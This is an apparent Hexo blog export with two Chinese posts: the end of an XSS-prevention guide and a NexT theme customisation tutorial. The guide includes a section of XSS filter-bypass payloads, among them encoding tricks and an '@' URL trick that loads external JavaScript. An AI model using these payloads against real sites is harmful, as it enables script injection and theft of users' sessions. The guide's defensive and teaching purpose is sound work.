等。在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接HTML的问题。对HTML做充分转义。 如果拼接HTML是必要的，就需要采用合适的转义库，对HTML模板各处插入点进行充分的转义。 对于HTML转义通常只有一个规则，就是把 &amp; &lt; &gt; &quot; &#39; / 这几个字符转义掉，确实能起到一定的xss防护作用，但并不完善。要完善xss防护措施，要使用更完善更细致的转义策略。例如Java工程里，常用的转义库为 org.owasp.encoder。XSS 安全漏洞简单转义是否有防护作用HTML 标签文字内容有HTML 属性值有CSS 内联样式无内联 JavaScript无内联 JSON无跳转链接无 在输出数据之前对潜在的威胁的字符进行编码、转义对xss攻击能起到一定的防御作用。 对所有要动态输出到页面的内容，通通进行相关的编码和转义。当然转义是按照其输出的上下文环境来决定如何转义的。作为body文本输出，html标签的属性输出，比如：123&lt;span&gt;$&#123;username&#125;&lt;/span&gt;&lt;p&gt;&lt;c:out value="$&#123;username&#125;"&gt;&lt;/c:out&gt;&lt;/p&gt;&lt;input type="text" value="$&#123;username&#125;" /&gt;此时的转义规则如下：&lt;转成 &amp;lt; &gt;转成 &amp;gt; &amp; 转成 &amp;amp; &quot;转成 &amp;quot;&#39;转成 &amp;#39 \转成\\ /转成 \/ ;转成 ；(全角;)javascript事件1&lt;input type="button" οnclick='go_to_url("$&#123;myUrl&#125;");' /&gt;URL属性 如果 &lt;script&gt;、&lt;style&gt;、&lt;imt&gt;等标签的 src 和 href 属性值为动态内容，那么要确保这些URL没有执行恶意连接。确保：href和 src的值必须以 http://开头，白名单方式；不能有10进制和16进制编码字符。DOM型XSS攻击的防御 DOM型xss攻击，实际上就是网站前端JavaScript代码本身不够严谨，把不可信的数据当作代码执行了。 在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为HTML插到页面上，而应尽量使用 .textContent、.setAttribute() 等。 如果用Vue/React技术栈，并且不使用 v-html/dangerouslySetInnerHTML 功能，就在前端render阶段避免 innerHTML、outerHTML 的xss隐患。 DOM中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，&lt;a&gt; 标签的 href 属性，JavaScript的 eval()、setTimeout()、setInterval()等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些API，很容易产生安全隐患，请务必避免。12345678910111213&lt;!-- 内联事件监听器中包含恶意代码 --&gt; &lt; img onclick = "UNTRUSTED" onerror = "UNTRUSTED" src = "data:image/png," &gt; &lt;!-- 链接内包含恶意代码 --&gt; &lt; a href = "UNTRUSTED" &gt; 1 &lt;/ a &gt; &lt; script &gt; // setTimeout()/setInterval() 中调用恶意代码 setTimeout( "UNTRUSTED" )setInterval( "UNTRUSTED" ) // location 调用恶意代码 location.href = 'UNTRUSTED' // eval() 中调用恶意代码 eval ( "UNTRUSTED" ) &lt;/ script &gt;其他xss攻击的防御HttpOnly xss一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对 Cookie 设置了HttpOnly 属性，那么js脚本将无法读取到cookie，但是浏览器还是能够正常使用cookie，这样能有效的防止xss的攻击。 一般的Cookie都是从document对象中获得的，现在浏览器在设置 Cookie的时候一般都接受一个叫做HttpOnly的参数，跟domain等其他参数一样，一旦这个HttpOnly被设置，你在浏览器的 document对象中就看不到Cookie了，而浏览器在浏览的时候不受任何影响，因为Cookie会被放在浏览器头中发送出去(包括ajax的时候)，应用程序也一般不会在js里操作这些敏感Cookie的，对于一些敏感的Cookie我们采用HttpOnly，对于一些需要在应用程序中用js操作的cookie我们就不予设置，这样就保障了Cookie信息的安全也保证了应用。Content Security Policy（内容安全策略）严格的CSP在XSS的防范中可以起到以下的作用：禁止加载外域代码，防止复杂的攻击逻辑。禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。合理使用上报可以及时发现 XSS，利于尽快修复问题。输入内容长度控制 对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止xss发生，但可以增加xss攻击的难度。小结 XSS攻击防御方法：XSS filter；纯前端渲染，数据分离；HTML转义；设置HttpOnly属性；设置CSP；限制输入内容的长度XSS绕过的技巧 有xss防御便会有xss绕过防御姿势，这是攻与防不断博弈的表现与成果。大小写绕过1&lt;Script&gt;alert(1)&lt;/Script&gt;双写绕1&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;替换绕过1过滤 alert 用prompt，confirm，top['alert'](1)代替绕过过滤() 用``代替绕过过滤空格 用%0a（换行符）,%0d（回车符），/**/代替绕过小写转大写情况下 字符ſ大写后为S（ſ不等于s）%00截断绕过1&lt;a href=javascr%00ipt:alert(1)&gt;xss&lt;/a&gt;编码绕过123456789实体编码javascrip&amp;#x74;:alert(1) 十六进制javascrip&amp;#116;:alert(1) 十进制unicode编码javascrip\u0074:alert(1)url编码javascrip%74:alert(1)fromCharCode方法绕过12String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))javascript伪协议绕过 无法闭合双引号的情况下，就无法使用onclick等事件，只能伪协议绕过，或者调用外部js换行绕过正则匹配12onmousedown=alert(1)注释符12345678// 单行注释&lt;!-- --!&gt; 注释多行内容&lt;!-- --&gt; 注释多行内容&lt;-- --&gt; 注释多行内容&lt;-- --！&gt; 注释多行内容--&gt; 单行注释后面内容/* */ 多行注释有时还可以利用浏览器的容错性，不需要注释闭合标签空格绕过1&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;@符号绕过url限制1https://www.segmentfault.com@xss.haozi.me/j.js其实访问的是@后面的内容“)逃逸函数后接分号1");alert(1)//\绕过转义限制12\")alert(1) //XSS练习平台 以下是几个XSS攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。alert(1) to win prompt(1) to win XSS game XSS Challenges参考资料前端安全系列（一）：如何防止XSS攻击？浅谈跨站脚本攻击与防御面试问题如何预防xss攻击xss攻击原理与解决方法XSS攻击及预防OWASP Top 10 - 2017]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>跨站脚本攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[定制Hexo+NexT的个性化博客]]></title>
    <url>%2Fposts%2Fccfc6699.html%2F</url>
    <content type="text"><![CDATA[日出江花红胜火，春来江水绿如蓝 前几天，我写了一篇关于如何使用GitHub＋Hexo搭建个人博客的博文，接下来我会以我的博客为例，讲讲如何对NexT主题的个性化定制和一些细节的优化。前言 这篇博客主要是next主题的个性化定制，还有一些细节的优化。在搭建的过程，有一些优化，也是参考了大量之前大佬的教程和结合了一些做的比较优秀的博客，我在这里做了一个集合，同时把自己做的而别人没有做的优化，写出来方便大家。 参考的文章我都会贴出原文链接，但是有一些优化，是我自己辛苦更改样式才做出来的效果，有些也是忘记了具体的修改方法，主要是直接审查元素，一点一点的定位到样式表，一点一点的测试修改，相信通过审查元素，你也可以做到。安装NexT主题 我使用的是比较简约的NexT主题，如果你对其他主题感兴趣，可以点击这里。 安装方法：打开博客根目录下的themes文件夹，右键Git Bash，运行命令：git clone https://github.com/iissnan/hexo-theme-next themes/next 下载好之后，把hexo-theme-next改为next，接着打开next目录下的主题配置文件_config.yml，找到theme字段，把参数改为theme: next，之后在根目录下运行：12hexo cleanhexo s -g关于_config.yml 首先_config.yml，它是主题配置文件，有两个，名字一样比较容易混淆。站点配置文件，位于站点文件夹的根目录下例如我的是H:/blog/_config.yml主题配置文件，位于主题文件夹的根目录下例如我的是H:/blog/themes/next/_config.yml Next这个主题包含4钟风格，默认的是Muse，我使用的是Pisces。你也可以尝试其他风格，具体操作：打开H:/blog/_config.yml，定位到Schemes，想要哪款主题就取消前面的#。12345# Schemes#scheme: Muse#scheme: Mistscheme: Pisces#scheme: GeminiNext主题美化接下来就是主题的美化啦添加Github丝带或者角标效果图实现方法 首先先点击这里或者这里挑选自己喜欢的样式，并复制代码。 打开themes/next/layout/_layout.swig文件，在&lt;header&gt;&lt;/header&gt;之前添加代码，并把href改为你的博客地址添加RSS订阅效果图实现方法 首先在博客的根目录H:/blog，安装Hexo插件，插件会放在node_modules这个文件夹。1npm install --save hexo-generator-feed 接下来打开H:/blog/_config.yml文件，在末尾添加1234# Extensions## Plugins: http://hexo.io/plugins/# RSS订阅plugin: hexo-generator-feed 然后打开H:/blog/themes/next/_config.yml文件,找到rss，添加参数123# hexo-generator-feed required for rss support. Leave rss as blank to use site's feed link.# Set rss to false to disable feed link. Set rss to specific value if you have burned your feed already.rss: /atom.xml添加动态背景效果图实现方法 打开H:/blog/_config.yml文件，找到canvas_nest,把false改为true1234567canvas_nest: enable: true onmobile: true # display on mobile or not color: "0,0,255" # 线条颜色，三个数字分别为(R,G,B) opacity: 0.5 # 线条透明度（0~1） zIndex: -1 # 背景的z-index属性 count: 99 # 线条的总数量鼠标点击特效效果图实现方法 打开H:/blog/themes/next/source/js/src，新建一个firework.js文件，加入以下代码：1"use strict";function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color="#F00",a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:"easeOutExpo",update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:"linear",duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:"easeOutExpo",update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(".fireworks");if(canvasEl)&#123;var ctx=canvasEl.getContext("2d"),numberOfParticules=30,pointerX=0,pointerY=0,tap="mousedown",colors=["#FF1461","#18FF92","#5A87FF","#FBF38C"],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+"px",canvasEl.style.height=window.innerHeight+"px",canvasEl.getContext("2d").scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;"sidebar"!==e.target.id&amp;&amp;"toggle-sidebar"!==e.target.id&amp;&amp;"A"!==e.target.nodeName&amp;&amp;"IMG"!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener("resize",setCanvasSize,!1)&#125;"use strict";function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color="#F00",a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:"easeOutExpo",update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:"linear",duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:"easeOutExpo",update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(".fireworks");if(canvasEl)&#123;var ctx=canvasEl.getContext("2d"),numberOfParticules=30,pointerX=0,pointerY=0,tap="mousedown",colors=["#FF1461","#18FF92","#5A87FF","#FBF38C"],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+"px",canvasEl.style.height=window.innerHeight+"px",canvasEl.getContext("2d").scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;"sidebar"!==e.target.id&amp;&amp;"toggle-sidebar"!==e.target.id&amp;&amp;"A"!==e.target.nodeName&amp;&amp;"IMG"!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener("resize",setCanvasSize,!1)&#125;; 然后在H:/blog/themes/next/layout/_layout.swig文件中，&lt;/head&gt;之前加入以下代码：1234&lt;!-- 爆炸红心效果 --&gt;&lt;canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" &gt;&lt;/canvas&gt; &lt;script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="/js/src/yanhuatexiao.js"&gt;&lt;/script&gt; 还可以换成点击出现爱心的特效,方法是一样的。1!function(e,t,a)&#123;function n()&#123;c(".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 500%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"),o(),r()&#125;function r()&#123;for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText="left:"+d[e].x+"px;top:"+d[e].y+"px;opacity:"+d[e].alpha+";transform:scale("+d[e].scale+","+d[e].scale+") rotate(45deg);background:"+d[e].color+";z-index:99999");requestAnimationFrame(r)&#125;function o()&#123;var t="function"==typeof e.onclick&amp;&amp;e.onclick;e.οnclick=function(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;function i(e)&#123;var a=t.createElement("div");a.className="heart",d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;function c(e)&#123;var a=t.createElement("style");a.type="text/css";try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName("head")[0].appendChild(a)&#125;function s()&#123;return"rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")"&#125;var d=[];e.requestAnimationFrame=function()&#123;return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);修改超链接的颜色效果图实现方法 打开H:\blog\themes\next\source\css\_common\components\post文件夹下的post.styl,添加以下css样式：12345678.post-body p a &#123; color: #0593d3; border-bottom: none; &amp;:hover &#123; color: #fc6423; text-decoration: underline; &#125;&#125; 其中选择.post-body 是为了不影响标题，选择 p 是为了不影响首页“阅读全文”的显示样式,颜色可以自己定义。文章结尾添加结束标记效果图实现方法 打开H:/blog/themes/next/layout/_macro文件夹，新建passage-end-tag.swig 文件,并添加以下内容：12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------本文结束&lt;i class="fa fa-paw"&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 然后打开H:/blog/themes/next/layout/_macro/post.swig文件，在post-body 之后， post-footer 之前添加以下代码：12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 接着在H:/blog/themes/next/_config.yml末尾添加：123# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true修改文章底部带#号的标签效果图实现方法 修改H:/blog/themes/next/layout/_macro/post.swig，搜索 rel=&quot;tag&quot;&gt;#，将 # 换成&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;设置博客头像并旋转效果图实现方法 打开H:/blog/themes/next/source/images,把头像放到该目录下，然后打开H:/blog/_config.yml,找到avatar:，修改为以下内容：1234567891011avatar: # In theme directory (source/images): /images/avatar.gif # In site directory (source/uploads): /uploads/avatar.gif # You can also use other linking images. url: /images/avatar.gif # If true, the avatar would be dispalyed in circle. rounded: true # The value of opacity should be choose from 0 to 1 to set the opacity of the avatar. opacity: 1 # If true, the avatar would be rotated with the cursor. rotated: true快速实现博客压缩 项目压缩也叫代码丑化, 分别对 html、css、js、images进行优化，即把重复的代码合并，把多余的空格去掉，用算法把 images 进行压缩。压缩后的博客，加载速度会有较大的提升，自然能留住更多游客。 蛮多朋友使用了gulp对博客进行压缩，这也是一个办法，但在社区逛了下，找到了一个比较好用的模块hexo-all-minifier，这个模块集成了对 html、css、js、image 的优化。1npm install hexo-all-minifier --save 安装上此模块后，只要在根目录下的_config.yml文件中加上如下字段就可对博客所有内容进行压缩。12345678910111213141516171819202122232425html_minifier: enable: true ignore_error: false exclude:css_minifier: enable: true exclude: - '*.min.css'js_minifier: enable: true mangle: true output: compress: exclude: - '*.min.js'image_minifier: enable: true interlaced: false multipass: false optimizationLevel: 2 pngquant: false progressive: false侧边栏添加社交图标效果图实现方法 打开主题配置文件_config.yml，搜索social:,在图标库找自己喜欢的小图标，并将名字复制在如下位置，保存即可主页文章添加阴影效果效果图实现方法 打开H:\blog\themes\next\source\css\_common\components\post文件夹下的post.styl,添加以下css样式：12345678// 主页文章添加阴影效果 .post &#123; margin-top: 0px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125;在博客底部添加访问量效果图实现方法 打开H:/blog/themes/next/_config.yml,找到busuanzi，修改为以下参数：123456busuanzi_count: enable: true total_visitors: true total_visitors_icon: user total_views: true total_views_icon: eye使用leancloud统计页面访问次数效果图实现方法 主题集成了leancloud，但是我们还需要去官网注册账号并实名，这里讲一下关键的步骤。配置leancloud创建应用：控制台 --&gt; 创建应用（开发版）应用名称可以随意输入，后面还可以修改，我的是blog创建class： 点击刚创建的应用，创建一个 Class 表用来保存我们的博客访问数据。此处创建的 Class 名字必须为 Counter，ACL 权限选择 无限制。创建 Class 完成之后，新创建的 Counter 表会显示在左侧，这时再切换到 test 应用的 设置 - 应用 Key 界面：复制ID和Key启用leancloud 打开_config.yml主题配置文件，找到leancloud_visitors:,填入id和key。修改热度 打开H:/blog/themes/next/layout/_macro/post.swig文件，找到leancloud,修改成如下代码： 最后打开H:/blog/themes/next/languages/zh-CN.yml,把views参数改成如下：博客标题设置 这个相关的设置在H:/blog/_config.yml中修改，如下图所示：博客底部添加网站的运行时间效果图实现方法 打开H:/blog/themes/next/layout/_partials/footer.swig，在末尾添加如下代码;12345678910111213141516171819&lt;!-- 网站运行时间的设置 --&gt;&lt;span id="timeDate"&gt;载入天数...&lt;/span&gt;&lt;span id="times"&gt;载入时分秒...&lt;/span&gt;&lt;script&gt; var now = new Date(); function createtime() &#123; var grt= new Date("07/12/2019 18:30:00");//此处修改你的建站时间或者网站上线时间 now.setTime(now.getTime()+250); days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); if(String(hnum).length ==1 )&#123;hnum = "0" + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = "0" + mnum;&#125; seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = "0" + snum;&#125; document.getElementById("timeDate").innerHTML = "网站已运行 "+dnum+" 天 "; document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; &#125;setInterval("createtime()",250);&lt;/script&gt;添加 README.md 文件 每个项目下一般都有一个 README.md 文件，但是使用 hexo 部署到仓库后，项目下是没有 README.md 文件的。 在 Hexo 目录下的 source 根目录下添加一个 README.md 文件，修改站点配置文件 _config.yml，将 skip_render 参数的值设置为skip_render: README.md 保存退出即可。再次使用 hexo d 命令部署博客的时候就不会在渲染 README.md 这个文件了。自定义网站的图标效果图实现方法 我的图标是在阿里矢量图标库下载的，你也可以在其他地方下载或者制作，然后把图标放在H：/blog/themes/next/source/images里面，斌且修改主题配置文件：1234567favicon: small: /images/favicon-16x16-next.png medium: /images/favicon-32x32-next.png apple_touch_icon: /images/apple-touch-icon-next.png safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xml文章字数、阅读时长统计效果图实现效果 打开博客根目录，运行以下命令，安装插件1npm install hexo-symbols-count-time --save 然后修改博客配置文件，在末尾添加以下代码：123456symbols_count_time: symbols: true # 文章字数统计 time: true # 文章阅读时长 total_symbols: true # 站点总字数统计 total_time: true # 站点总阅读时长 exclude_codeblock: false # 排除代码字数统计 最后在主题配置文件里面，找到symbols_count_time,修改成以下内容：1234567symbols_count_time: separated_meta: true # 是否另起一行（true的话不和发表时间等同一行） item_text_post: true # 首页文章统计数量前是否显示文字描述（本文字数、阅读时长） item_text_total: true # 页面底部统计数量前是否显示文字描述（站点总字数、站点阅读时长） awl: 1.5 # Average Word Length wpm: 100 # Words Per Minute（每分钟阅读词数） suffix: mins.博客顶端添加加载条效果图实现方法 打开主题配置文件，找到pace:，修改为以下内容：123456pace: true# Themes list:# pace-theme-big-counter | pace-theme-bounce | pace-theme-barber-shop | pace-theme-center-atom# pace-theme-center-circle | pace-theme-center-radar | pace-theme-center-simple | pace-theme-corner-indicator# pace-theme-fill-left | pace-theme-flash | pace-theme-loading-bar | pace-theme-mac-osx | pace-theme-minimalpace_theme: pace-theme-minimal在文章底部添加版权信息效果图实现方法 打开H：/blog/themes/next/layout/_macro，添加my-copyright.swig，代码如下：12345678910111213141516171819202122232425262728293031&#123;% if page.copyright %&#125;&lt;div class="my_post_copyright"&gt; &lt;script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"&gt;&lt;/script&gt; &lt;!-- JS库 sweetalert 可修改路径 --&gt; &lt;script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"&gt;&lt;/script&gt; &lt;script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"&gt;&lt;/script&gt; &lt;link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"&gt; &lt;p&gt;&lt;span&gt;本文标题:&lt;/span&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;文章作者:&lt;/span&gt;&#123;&#123; theme.author &#125;&#125;&lt;/a&gt; | 【公众号：不会代码的程序猿】&lt;/p&gt; &lt;p&gt;&lt;span&gt;发布时间:&lt;/span&gt;&#123;&#123; page.date.format("YYYY年MM月DD日 HH:mm:ss") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;最后更新:&lt;/span&gt;&#123;&#123; page.updated.format("YYYY年MM月DD日 HH:mm:ss") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;原始链接:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;" title="&#123;&#123; page.title &#125;&#125;"&gt;&#123;&#123; page.permalink &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;许可协议:&lt;/span&gt;&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。&lt;/p&gt; &lt;/div&gt;&lt;script&gt; var clipboard = new Clipboard('.fa-clipboard'); clipboard.on('success', $(function()&#123; $(".fa-clipboard").click(function()&#123; swal(&#123; title: "", text: '复制成功', html: false, timer: 500, showConfirmButton: false &#125;); &#125;); &#125;)); &lt;/script&gt;&#123;% endif %&#125; 然后在H：/blog/themes/next/source/css/_common/components/post/下添加my-post-copyright.styl：123456789101112131415161718192021222324252627282930313233343536373839404142434445.my_post_copyright &#123; width: 85%; max-width: 45em; margin: 2.8em auto 0; padding: 0.5em 1.0em; border: 1px solid #d3d3d3; font-size: 0.93rem; line-height: 1.6em; word-break: break-all; background: rgba(255,255,255,0.4);&#125;.my_post_copyright p&#123;margin:0;&#125;.my_post_copyright span &#123; display: inline-block; width: 5.2em; color: #333333; // title color font-weight: bold;&#125;.my_post_copyright .raw &#123; margin-left: 1em; width: 5em;&#125;.my_post_copyright a &#123; color: #808080; border-bottom:0;&#125;.my_post_copyright a:hover &#123; color: #0593d3; // link color text-decoration: underline;&#125;.my_post_copyright:hover .fa-clipboard &#123; color: #000;&#125;.my_post_copyright .post-url:hover &#123; font-weight: normal;&#125;.my_post_copyright .copy-path &#123; margin-left: 1em; width: 1em; +mobile()&#123;display:none;&#125;&#125;.my_post_copyright .copy-path:hover &#123; color: #808080; cursor: pointer;&#125; 然后打开H:/blog/themes/next/layout/_macro/post.swig文件，在post-body 之后， post-footer 之前添加以下代码：12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'my-copyright.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 最后修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码：1@import "my-post-copyright"添加来必力评论系统效果图实现方法 打开来必力的官网，注册，注册好之后打开设置页面，填写博客地址 然后在代码管理页面，把uid复制到主题配置文件_config.yml的livere_uid:修改博客底部的红色跳动爱心 打开主题配置文件，找到footer:，修改为以下内容：DaoVoice在线联系效果图实现方法 先在 daovoice 注册账号，邀请码是dda712fb，注册完成后会得到一个 app_id : 然后打开/themes/next/layout/_partials/head.swig,在末尾添加如下代码：123456789&#123;% if theme.daovoice %&#125; &lt;script&gt; (function(i,s,o,g,r,a,m)&#123;i["DaoVoiceObject"]=r;i[r]=i[r]||function()&#123;(i[r].q=i[r].q||[]).push(arguments)&#125;,i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)&#125;)(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/dda712fb.js","daovoice") daovoice('init', &#123; app_id: "&#123;&#123;theme.daovoice_app_id&#125;&#125;" &#125;); daovoice('update'); &lt;/script&gt;&#123;% endif %&#125; 最后打开主题配置文件，在末尾添加如下代码：123# Online contactdaovoice: truedaovoice_app_id: 这里填你的刚才获得的 app_id设置博客摘要显示 